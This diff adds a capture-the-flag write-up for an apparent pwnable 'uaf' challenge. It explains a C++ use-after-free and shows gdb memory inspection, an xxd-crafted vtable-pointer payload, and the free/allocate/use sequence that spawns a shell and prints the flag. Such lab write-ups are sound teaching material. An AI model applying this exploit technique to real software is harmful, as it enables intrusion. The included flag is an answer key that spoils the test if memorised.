@@ -1,0 +1,90 @@
+We have C++ code with a Human class with private give_shell and public virtual introduce functions.
+We also have two derived classes, Man and Woman, that overwrite introduce.
+
+In main, an instance of each of the two derived classes is allocated with its address saved a Human pointer:
+
+Human* m = new Man("Jack", 25);
+Human* w = new Woman("Jill", 21); 
+
+Then we have an infinite loop with three choices: call introduce, allocate argv[2] with length argv[1], or delete the pointers:
+
+switch(op){
+			case 1:
+				m->introduce();
+				w->introduce();
+				break;
+			case 2:
+				len = atoi(argv[1]);
+				data = new char[len];
+				read(open(argv[2], O_RDONLY), data, len);
+				cout << "your data is allocated" << endl;
+				break;
+			case 3:
+				delete m;
+				delete w;
+				break;
+			default:
+				break;
+}
+
+When freed, dynamic memory is added to a linked list until being removed for reallocation.
+We can use this to change the vtable pointer at the beginning of the object such that calling introduce will invoce the give_shell, thus exploiting a use after free.
+
+using disas main gdb:
+
+0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
+0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
+
+(from my personal experience, saving the address of the allocated object to a pointer is the next instruction after a function all and involves moving rbx to a PTR)
+
+The vtable of each derived class has the give_shell ptr at the lowest address followed by a custom introduce ptr (Each 8 bytes).
+
+Thus, decreasing the vtable ptr which is stored at the lowest address of each instance by 8 followed by a call to custom instance will call the give_shell function.
+
+m's introduce is called first when 1 is given as input but as the malloc bin is LIFO we'll have to allocate twice to overwrite it.
+
+
+(gdb) break *0x0000000000400f7a
+Breakpoint 1 at 0x400f7a
+(gdb) run
+Starting program: /home/uaf/uaf
+
+Breakpoint 1, 0x0000000000400f7a in main ()
+(gdb) x $rbp-0x38
+0x7ffdb74d4678: 0x00c8cc50
+(gdb)
+0x7ffdb74d467c: 0x00000000 // address of vtable ptr (start of object)
+(gdb) x 0x00c8cc50
+0xc8cc50:       0x00401570
+(gdb)
+0xc8cc54:       0x00000000 // address of vtable (give_shell ptr)
+
+Now we write the new address (address of vtable-8) to a file
+
+uaf@pwnable:~$ echo 6815400000000000 | xxd -r -p > /tmp/itamar3/file
+
+free, allocate, allocate, then use
+uaf@pwnable:~$ ./uaf 8 /tmp/itamar3/file
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+$ cat flag
+yay_f1ag_aft3r_pwning
+$
+
+//We got out shell, just 'cat flag'
